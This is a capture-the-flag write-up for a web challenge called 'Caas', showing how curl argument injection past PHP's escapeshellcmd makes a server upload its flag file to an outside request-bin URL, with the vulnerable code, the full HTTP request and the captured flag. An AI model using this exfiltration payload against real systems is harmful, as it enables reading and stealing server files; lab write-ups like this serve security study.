# Caas
Website inputs a url, checks to see if it works, then returns the data associated with the website:

![](https://i.imgur.com/CQPfvuT.png)


Front-end JavaScript checks to see if the inputed value is a valid URL. However it does not check on the backend. Using **Burp**, we can pass in values/flags for curl, for example `-V` for its version:

![](https://i.imgur.com/FJpnVVE.png)

And we get curl's version as the response.

The code that executes the curl command is in `web_caas/challengemodels/CommandModel.php`:
```php=
<?php
class CommandModel
{
    public function __construct($url)
    {
        $this->command = "curl -sL " . escapeshellcmd($url);
    }

    public function exec()
    {
        exec($this->command, $output);
        return $output;
    }
}
?>
```
The issue lies in `escapeshellcmd()`.

`escapeshellcmd()` escapes characters that could allow additional code execution, such as `&`, `|`, `&&` and more. However: unlike the similiar command `escapeshellcmdargs()` it doesn't care how many commands you pass in.

[This is exploitable with a number of functions, and **curl** is one of them.](https://github.com/kacperszurek/exploits/blob/master/GitList/exploit-bypass-php-escapeshellarg-escapeshellcmd.md#curl)

I exploited this by creating a bucket on https://requestbin.com. Then I sent the following request:
```javascript=
POST /api/curl HTTP/1.1

Host: 46.101.37.171:30157

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Referer: http://46.101.37.171:30157/

Content-Type: application/x-www-form-urlencoded

Origin: http://46.101.37.171:30157

Content-Length: 60

Connection: close



ip=-F flag=@../../flag https://enmfamuouytzk.x.pipedream.net
```

Remember, the command's format looks like:
```php=
$command = "curl -sL " . escapeshellcmd($url);
```
So with out injection it looks like this:
```php=
$command = "curl -sL " . escapeshellcmd("-F flag=@../../flag https://enmfamuouytzk.x.pipedream.net");
```
Which executes:
```bash=
curl -sL -F flag=@../../flag https://enmfamuouytzk.x.pipedream.net)
```

This command uploads the contents of `../../flag` to the url provided. Giving us the flag: `CHTB{f1le_r3trieval_4s_a_s3rv1ce}`